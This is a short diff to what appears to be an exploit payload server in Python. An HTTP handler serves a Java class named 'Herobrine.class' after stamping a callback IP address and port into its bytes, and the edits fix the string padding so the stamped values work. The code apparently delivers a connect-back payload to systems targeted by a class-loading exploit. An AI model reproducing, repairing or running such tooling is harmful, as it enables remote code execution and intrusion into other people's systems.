@@ -7,8 +7,8 @@ SRC_PORT = 1337
 
 HEROBRINE_CLASS = "Herobrine.class"
 
-IP_ADDR_STAMP = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-PORT_NO_STAMP = b"BBBBBBBB"
+IP_ADDR_STAMP = b"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+PORT_NO_STAMP = b"########"
 
 
 class HerobrineHandler(BaseHTTPRequestHandler):
@@ -16,8 +16,10 @@ class HerobrineHandler(BaseHTTPRequestHandler):
 
     @staticmethod
     def _stamp_str_data(buf: bytes, pattern: bytes, str_data: str) -> bytes:
+        # java strings are not null terminated and have an internal length field
+        #   preserve length/padding char here, and let Java trim the extra
         encoded = str_data.encode("ascii")
-        encoded += b"\0" * (len(pattern) - len(encoded))
+        encoded += pattern[0:1] * (len(pattern) - len(encoded))
         return buf.replace(pattern, encoded, 1)
 
     def do_GET(self):
@@ -42,6 +44,8 @@ class HerobrineHandler(BaseHTTPRequestHandler):
             class_bytes = self._stamp_str_data(class_bytes, IP_ADDR_STAMP, remote_ip)
             class_bytes = self._stamp_str_data(class_bytes, PORT_NO_STAMP, remote_port)
         except Exception as exc:
+            import traceback
+            traceback.print_exc(exc)
             self.send_response(500)  # 500 Internal Server Error
             self.end_headers()
             return
